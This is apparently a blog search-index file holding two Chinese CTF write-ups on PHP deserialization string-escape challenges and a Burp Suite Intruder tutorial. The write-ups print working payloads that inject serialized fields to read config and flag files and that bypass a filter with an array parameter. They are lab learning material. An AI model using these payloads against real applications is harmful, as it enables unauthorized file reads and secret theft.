<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>BUUCTF [0CTF 2016]piapiapia</title>
    <url>/2021/12/08/BUUCTF-0CTF2016-piapiapia/</url>
    <content><![CDATA[<h1 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h1><p>信息泄露</p>
<p>PHP反序列化字符串逃逸(替换后导致字符串变长)</p>
<p>参数传递数组绕过字符串检测</p>
<h1 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h1><p><a href="https://buuoj.cn/challenges#%5B0CTF%202016%5Dpiapiapia">https://buuoj.cn/challenges#%5B0CTF%202016%5Dpiapiapia</a></p>
<h1 id="1-启动环境，一个登录框"><a href="#1-启动环境，一个登录框" class="headerlink" title="1.启动环境，一个登录框"></a>1.启动环境，一个登录框</h1><p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112082126949.png" alt="image-20211208212657892"></p>
<h1 id="2-dirsearch扫描"><a href="#2-dirsearch扫描" class="headerlink" title="2.dirsearch扫描"></a>2.dirsearch扫描</h1><p>先拿dirsearch扫描一遍，第一次什么也没有扫到，全部都是429。加上延时并且调一下线程再扫描一次，这一次我们扫到了压缩文件，但是普通的php文件扫不到~~。</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112082126214.png" alt="image-20211208212615163"></p>
<span id="more"></span>

<h1 id="3-下载源码审计"><a href="#3-下载源码审计" class="headerlink" title="3.下载源码审计"></a>3.下载源码审计</h1><p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112082131608.png" alt="image-20211208213157549"></p>
<p>打开config.php,我们发现了flag</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112082134286.png" alt="image-20211208213426231"></p>
<p>继续分析源码，发现三处敏感函数：</p>
<p>第一个：</p>
<p><strong>unserialize()</strong> 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。</p>
<p><strong>参数：</strong></p>
<p>序列化后的字符串。</p>
<p>若被反序列化的变量是一个对象，在成功地重新构造对象之后，PHP 会自动地试图去调用 <a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.wakeup">__wakeup()</a> 成员函数（如果存在的话）。</p>
<p><strong>返回值</strong></p>
<p>返回的是转换之后的值，可为 integer、float、string、array 或 object。</p>
<p>如果传递的字符串不可反序列化，则返回 **<code>false</code>**，并产生一个 **<code>E_NOTICE</code>**。</p>
<p>第二个：</p>
<p><strong>file_get_contents</strong> — 将整个文件读入一个字符串</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112082211233.png" alt="image-20211208221156183"></p>
<p>第三个：</p>
<p><strong>serialize()</strong> 返回字符串，此字符串包含了表示 <code>value</code> 的字节流，可以存储于任何地方。</p>
<p>这有利于存储或传递 PHP 的值，同时不丢失其类型和结构。</p>
<p>想要将已序列化的字符串变回 PHP 的值，可使用 <a href="https://www.php.net/manual/zh/function.unserialize.php">unserialize()</a>。<strong>serialize()</strong> 可处理除了 resource 之外的任何类型。甚至可以 <strong>serialize()</strong> 那些包含了指向其自身引用的数组。你正 <strong>serialize()</strong> 的数组／对象中的引用也将被存储。</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112082213262.png" alt="image-20211208221307187"></p>
<p>推测应该是让我们通过file_get_contents函数去请求config.php文件</p>
<p>如果能让photo为config.php，而这数值来自$profile的反序列化，查看$profile</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function update_profile($username, $new_profile) &#123;</span><br><span class="line">		$username = parent::filter($username);</span><br><span class="line">		$new_profile = parent::filter($new_profile);</span><br><span class="line"></span><br><span class="line">		$where = &quot;username = &#x27;$username&#x27;&quot;;</span><br><span class="line">		return parent::update($this-&gt;table, &#x27;profile&#x27;, $new_profile, $where);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>发现有过滤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function filter($string) &#123;</span><br><span class="line">		$escape = array(&#x27;\&#x27;&#x27;, &#x27;\\\\&#x27;);</span><br><span class="line">		$escape = &#x27;/&#x27; . implode(&#x27;|&#x27;, $escape) . &#x27;/&#x27;;</span><br><span class="line">		$string = preg_replace($escape, &#x27;_&#x27;, $string);</span><br><span class="line"></span><br><span class="line">		$safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;);</span><br><span class="line">		$safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;;</span><br><span class="line">		return preg_replace($safe, &#x27;hacker&#x27;, $string);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>要进行字符串的逃逸应该先考虑用nickname来构造字符串逃逸photo应为nickname在其前面<br>然后发现nickname有正则过滤，考虑用数组来进行绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10)</span><br><span class="line">			die(&#x27;Invalid nickname&#x27;);</span><br></pre></td></tr></table></figure>

<p>数组绕过后就考虑进行逃逸将photo挤出去<br>所以我们需要构造nickname的参数值为”;}s:5:”photo”;s:10:”config.php”;}<br>这里为什么要在前面加一个}呢？？？，因为为了绕过nickname的正则匹配我们将其构造成了数组，数组在反序列化要进行闭合，可以尝试一下<br>构造代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function filter($str)&#123;</span><br><span class="line">    return str_replace(&#x27;bb&#x27;, &#x27;ccc&#x27;, $str);</span><br><span class="line">&#125;</span><br><span class="line">class A&#123;</span><br><span class="line">    public $name=&#x27;aaaa&#x27;;</span><br><span class="line">    public $pass=&#x27;123456&#x27;;</span><br><span class="line">    public $nickname = array(&#x27;a&#x27; =&gt; &#x27;Apple&#x27; ,&#x27;b&#x27; =&gt; &#x27;banana&#x27; , &#x27;c&#x27; =&gt; &#x27;Coconut&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">$AA=new A();</span><br><span class="line">echo serialize($AA).&quot;\n&quot;;</span><br><span class="line">// $res=filter(serialize($AA));</span><br><span class="line">// $c=unserialize($res);</span><br><span class="line">// echo $c-&gt;pass;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>运行结果发现数组位置进行了闭合<br><a href="https://img2020.cnblogs.com/blog/2092671/202009/2092671-20200922210058673-93856479.png"><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112082245706.png" alt="img"></a><br>这就是为啥上面要先进行}在逃逸<br>构造我们想要的内容后要进行逃逸，我们发现过滤的时候将where改成了hacker，进行了字符串拓展增建了一个字符串，我们构造的字符串长度为34所以我们要构造34个where进行逃逸</p>
<h1 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h1><p>参考一下两篇文章，阅读完毕后本人学习到了很多，十分感谢各位前辈！</p>
<p><a href="https://www.cnblogs.com/Lmg66/p/13709419.html">php反序列化漏洞 </a></p>
<p><a href="https://blog.csdn.net/qq_43622442/article/details/105751356">[0CTF 2016]piapiapia WP(详细)</a></p>
<h1 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h1><p>我们先通过 register.php 注册一个账号登录，上传图片抓包</p>
<p>payload:</p>
<p><code>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></p>
<p>在nickname位置输入payload抓包，把nickname改成nickname[] 数组</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112082201061.png" alt="image-20211208220100971"></p>
<p>然后点超链接到profile.php，看源代码找到image里面的base64字符串（因为之前分析file_get_contents的时候，它的外面还有一层base64_encode，而且它是photo参数，就是图片）</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112082203713.png" alt="image-20211208220339588"></p>
<p>解码获得flag</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112082204410.png" alt="image-20211208220408332"></p>
]]></content>
      <tags>
        <tag>BUUCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-[安洵杯2019]easy_serialize_php</title>
    <url>/2021/12/09/BUUCTF-%E5%AE%89%E6%B4%B5%E6%9D%AF2019-easy-serialize-php/</url>
    <content><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><p>反序列化字符逃逸(替换后导致字符串变短)</p>
<h1 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h1><p><a href="https://buuoj.cn/challenges#[%E5%AE%89%E6%B4%B5%E6%9D%AF%202019]easy_serialize_php">https://buuoj.cn/challenges#[%E5%AE%89%E6%B4%B5%E6%9D%AF%202019]easy_serialize_php</a></p>
<h1 id="审计代码"><a href="#审计代码" class="headerlink" title="审计代码"></a>审计代码</h1><p>启动环境</p>
<p>打开题目是一段代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;   <span class="comment">//fileter过滤函数，将falg,php等过滤为空</span></span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;		<span class="comment">//释放变量</span></span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);	<span class="comment">//POST的方法读入变量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])); <span class="comment">//get传入img，经过base64,shal加密</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;	<span class="comment">//phpinfo 提示有一些东西在这里</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);	<span class="comment">//序列化并打开img参数的文件</span></span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));	</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>我们先查看phpinfo中的数据，提示flag在d0g3_f1ag.php文件中</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112091730831.png" alt="image-20211209173041656"></p>
<span id="more"></span>

<h1 id="php反序列化字符逃逸过程分析"><a href="#php反序列化字符逃逸过程分析" class="headerlink" title="php反序列化字符逃逸过程分析"></a>php反序列化字符逃逸过程分析</h1><p>先构造代码</p>
<p><code>&lt;?php</code></p>
<p><code>function filter($img)&#123;</code><br>    <code>$filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);</code><br>    <code>$filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;</code><br>    <code>return preg_replace($filter,&#39;&#39;,$img);</code><br><code>&#125;</code></p>
<p><code>$_SESSION[&quot;user&quot;]=&#39;123&#39;; $_SESSION[&quot;function&quot;]=&#39;123&#39;;</code></p>
<p><code>//ZDBnM19mMWFnLnBocA==  base64解码为我们读取的d0g3_f1ag.php</code></p>
<p><code>$_SESSION[&quot;img&quot;]=&#39;ZDBnM19mMWFnLnBocA==&#39;;</code></p>
<p><code>var_dump(serialize($_SESSION)); echo &quot;&lt;pre&gt;&quot;; $serialize_info=filter(serialize($_SESSION));</code><br><code>var_dump($serialize_info);</code><br><code>var_dump(unserialize ($serialize_info));</code></p>
<p><code>?&gt;</code></p>
<p>运行截图：</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112092236098.png" alt="image-20211209223659045"></p>
<p>我们截取     <code>&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code></p>
<p>修改代码，将截取到的放到function中，并在最前面加一个A（一个字符）,最后注释掉img</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112092240437.png" alt="image-20211209224047389"></p>
<p>运行可以看到flag被过滤了，我们截取 <code>&quot;;s:8:&quot;function&quot;;s:42:&quot;A</code></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112092242122.png" alt="image-20211209224259070"></p>
<p>长度为24，所以我们选取6个flag（4*6=24）</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112092244030.png" alt="image-20211209224450985"></p>
<p>user处写入6个flag</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112092246653.png" alt="image-20211209224616598"></p>
<p>保存运行，我们看到了img变成了我们要读取的d0g3_f1ag.php文件</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112092245982.png" alt="image-20211209224555910"></p>
<h1 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h1><p>因此我们可以构造payload</p>
<p>我们发现上图只有两个参数user和img，缺少了function参数</p>
<p>我们POST传参时由于原本img参数逃逸了，所以只上传user和function两个参数。</p>
<p>因为user参数只能需要6个flag,所以我们在构造functionc参数时，需要多上传一个参数值</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112092318324.png" alt="image-20211209231841056"></p>
<p>我们截取 <code>A&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code> </p>
<p>并且在 “; 和 } 之间添加一个参数 <code>s:8:&quot;function&quot;;s:7:&quot;1234567&quot;;</code></p>
<p>所以我们最终构造的 payload为（post传输）：<br><code>_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=A&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:8:&quot;function&quot;;s:7:&quot;1234567&quot;;&#125;</code><br>然后查看显示，查看源代码：</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112092012952.png" alt="image-20211209201112020"></p>
<p>将img参数读取的文件改为/d0g3_fllllllag的base64加密<br>payload：<br><code>_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=1&quot;;s:8:&quot;function&quot;;s:7:&quot;1234567&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;</code></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112092011611.png" alt="image-20211209201141506"></p>
]]></content>
  </entry>
  <entry>
    <title>Burpsuite-Intruder功能详解</title>
    <url>/2021/12/08/Burpsuite-Intruder%E5%8A%9F%E8%83%BD%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h1 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h1><p><img src="https://img-blog.csdnimg.cn/ba71a7c2abad4dfcbcff4cbe930f8207.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<span id="more"></span>

<h1 id="Positions"><a href="#Positions" class="headerlink" title="Positions"></a>Positions</h1><p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081042282.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="攻击类型"><a href="#攻击类型" class="headerlink" title="攻击类型"></a>攻击类型</h2><h3 id="第一种-Sniper："><a href="#第一种-Sniper：" class="headerlink" title="第一种 Sniper："></a>第一种 Sniper：</h3><p>Sniper - 这个模式是我们最常用的，Sniper是狙击手的意思。这个模式会使用单一的payload【就是导入字典的payload】组。它会针对每个position中$$位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行测试。攻击中的请求总数应该是position数量和payload数量的乘积。</p>
<h3 id="第二种-Battering-ram："><a href="#第二种-Battering-ram：" class="headerlink" title="第二种 Battering ram："></a>第二种 Battering ram：</h3><p>Battering ram – 这一模式是使用单一的payload组。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。简单说就是一个playload字典同时应用到多个position中</p>
<h3 id="第三种-Pitchfork："><a href="#第三种-Pitchfork：" class="headerlink" title="第三种 Pitchfork："></a>第三种 Pitchfork：</h3><p>Pitchfork – 这一模式是使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。比如：position中A处有a字典，B处有b字典，则a【1】将会对应b【1】进行attack处理，这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量</p>
<h3 id="第四种-Cluster-bomb-："><a href="#第四种-Cluster-bomb-：" class="headerlink" title="第四种 Cluster bomb ："></a>第四种 Cluster bomb ：</h3><p>Cluster bomb – 这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。比如：position中A处有a字典，B处有b字典，则两个字典将会循环搭配组合进行attack处理这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。</p>
<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><h3 id="一-Sniper（狙击手模式）"><a href="#一-Sniper（狙击手模式）" class="headerlink" title="一 Sniper（狙击手模式）"></a><strong>一 Sniper（狙击手模式）</strong></h3><p>狙击手模式使用一组payload集合，它一次只使用一个payload位置，假设你标记了两个位置“A”和“B”，payload值为“1”和“2”，那么它攻击会形成以下组合（除原始数据外）：</p>
<table>
<thead>
<tr>
<th>attack NO.</th>
<th>location A</th>
<th>location B</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>1</td>
<td>no replace</td>
</tr>
<tr>
<td>2</td>
<td>2</td>
<td>no replace</td>
</tr>
<tr>
<td>3</td>
<td>no replace</td>
<td>1</td>
</tr>
<tr>
<td>4</td>
<td>no replace</td>
<td>2</td>
</tr>
</tbody></table>
<h3 id="二Battering-ram（攻城锤模式）"><a href="#二Battering-ram（攻城锤模式）" class="headerlink" title="二Battering ram（攻城锤模式）"></a><strong>二Battering ram（攻城锤模式）</strong></h3><p>攻城锤模式与狙击手模式类似的地方是，同样只使用一个payload集合，不同的地方在于每次攻击都是替换所有payload标记位置，而狙击手模式每次只能替换一个payload标记位置。</p>
<table>
<thead>
<tr>
<th>attack NO.</th>
<th>location A</th>
<th>location B</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>2</td>
<td>2</td>
<td>2</td>
</tr>
</tbody></table>
<h3 id="三Pitchfork（草叉模式）"><a href="#三Pitchfork（草叉模式）" class="headerlink" title="三Pitchfork（草叉模式）"></a><strong>三Pitchfork（草叉模式）</strong></h3><p>草叉模式允许使用多组payload组合，在每个标记位置上遍历所有payload组合，假设有两个位置“A”和“B”，payload组合1的值为“1”和“2”，payload组合2的值为“3”和“4”，则攻击模式如下：</p>
<table>
<thead>
<tr>
<th>attack NO.</th>
<th>location A</th>
<th>location B</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>1</td>
<td>3</td>
</tr>
<tr>
<td>2</td>
<td>2</td>
<td>4</td>
</tr>
</tbody></table>
<h3 id="四Cluster-bomb（集束炸弹模式）"><a href="#四Cluster-bomb（集束炸弹模式）" class="headerlink" title="四Cluster bomb（集束炸弹模式）"></a><strong>四Cluster bomb（集束炸弹模式）</strong></h3><p>集束炸弹模式跟草叉模式不同的地方在于，集束炸弹模式会对payload组进行笛卡尔积，还是上面的例子，如果用集束炸弹模式进行攻击，则除baseline请求外，会有四次请求：</p>
<table>
<thead>
<tr>
<th>attack NO.</th>
<th>location A</th>
<th>location B</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>1</td>
<td>3</td>
</tr>
<tr>
<td>2</td>
<td>1</td>
<td>4</td>
</tr>
<tr>
<td>3</td>
<td>2</td>
<td>3</td>
</tr>
<tr>
<td>4</td>
<td>2</td>
<td>4</td>
</tr>
</tbody></table>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>sniper 对变量依次进行破解。多个标记依次进行。</p>
<p>Battering ram 对变量同时进行破解。多个标记同时进行。</p>
<p>Pitchfork 每一个变量对应一个字典，取每一个字典的对应项</p>
<p>Cluster bomb 每个变量对应一个字典，并且进行交集破解，尝试各种组合，适用于用户名+密码的破解</p>
<h1 id="Payloads"><a href="#Payloads" class="headerlink" title="Payloads"></a>Payloads</h1><p>这个选项是用来配置一个或多个有效负荷的集合。如果定义了”cluster bomb”和”pitchfork”攻击类型，然后必须为每定义的有效负荷位置(最多8个)配置一个单独的有效负荷。使用”payload set”下拉菜单选择要配置的有效负荷。</p>
<p><strong>选项1：Payload Sets</strong> Payload数量类型设置</p>
<p><strong>选项2：Payload Opetions[Simple list]</strong> 该选项会根据选项1中Payload type的设置而改变</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081042314.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><strong>选项3：Payload Processing</strong> 对生成的Payload进行编码、加密、截取等操作</p>
<p><strong>您可以定义规则，在每个有效负载使用之前对其执行各种处理任务，对生成的Payload进行编码、加密、截取等操作</strong></p>
<p>add:添加一条规则，会弹出添加操作窗口，可添加的规则如下:</p>
<p>Add prefix -添加一个文字前缀、</p>
<p>Add suffix-添加一个文字后缀</p>
<p>Match/replace-将替换匹配特定正则表达式的有效载荷的任何部位，用一个文字字符串表示。</p>
<p>Substring -提取的有效载荷的子部分中，从指定的偏移量（0-索引）和至所指定的长度开始。</p>
<p>Reverse substring-对于子规则来说，最终的偏移量指定的有效载荷的末尾向后计数，并且长度从端部向后偏移计数。</p>
<p>Modify case·这个修改了的有效载荷的情况下，如果适用的话。同样的选项作为的情况下修改有效载荷类型</p>
<p>Encode - URL，HTML，Base64的，ASCII码或十六进制字符串构建各种平台:采用不同的计划，该编码的有效载荷。</p>
<p>Hash</p>
<p>Add raw payload-这之前或之后，在当前处理的值增加了原始负载值。它可以是有用的，例如，如果你需要提交相同的有效载荷在raw和哈希表。</p>
<p>Skip raw payload-将检查是否当前处理的值匹配指定的正则表达式，如果是这样，跳过有效载荷和移动到下一个。这可能是有用的，例如，如果知道一个参数值必须有一个最小长度和要跳过的一个列表，比这更短的长度的任何值。</p>
<p>Invoke Burp extension·调用一个Burp extension(扩展)来处理负载。扩展名必须已注册入侵者有效载荷处理器。您可以 从已己注册的当前加载的扩展可用的处理器列表中选择所需的处理器。</p>
<p>Edit:编辑一条规则。</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081042252.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> <strong>选项4：Payload Encoding</strong> 可以配置哪些有效载荷中的字符应该是URL编码的HTTP请求中的安全传输。任何已配置的URL编码最后应用，任何有效载荷处理规则执行之后。 这是推荐使用此设置进行最终URL编码，而不是一个有效载荷处理规则，因为可以用来有效载荷的grep选项来检查响应为呼应有效载荷的最终URL编码应用之前。 <img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081042158.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="Opetions"><a href="#Opetions" class="headerlink" title="Opetions"></a>Opetions</h1><p>此选项卡包含了request headers，request engine，attack results ，grep match，grep_extrack，grep payloads和redirections。你可以发动攻击之前，在主要Intruder的UI上编辑这些选项，大部分设置也可以在攻击时对已在运行的窗口进行修改。</p>
<p><strong>选项1：Request Headers 这些设置控制在Intruder是否更新配置请求头。</strong></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081042125.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">如果选中‘update Content-Length header’框，Burp Intruder 会使用每个请求的 HTTP 主体长度的正确值，添加或更新这个请求里 HTTP 消息头的内容长度。这个功能对一些需要把可变长度的有效载荷插入到 HTTP 请求模板主体的攻击是很有必要的。这个 HTTP 规范和大多数 web 服务器一样，需要使用消息头内容长度来指定 HTTP 主体长度的正确值。如果没有指定正确值，目标服务器会返回一个错误，也可能返回一个未完成的请求，也可能无限期地等待接收请求里的进一步数据。</p>
<p>如果选中‘set Connection: close’框，则 Burp Intruder 会添加或更新 HTTP 消息头的连接来请求在每个请求后已关闭的连接。在多数情况下，这个选项会让攻击执行得更快。</p>
<p><strong>选项2：Request Engine 设置发送请求的线程、超时重试等。</strong></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081042879.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><strong>选项3：Attack Results 设置攻击结果的显示。</strong>  </p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081042024.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> <strong>选项4：Grep – Match 在响应中找出存在指定的内容的一项。</strong> <img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081042451.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> <strong>选项5：Grep – Extract 通过正则提取返回信息中的内容。</strong></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081042827.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> <strong>选项6：Grep – Payloads  这些设置可以用于包含已提交的有效负载的反射的标志结果项目。如果启用了此选项，BurpSuite会添加包含一个复选框指示当前负载的值在每个响应发现新的结果列。</strong></p>
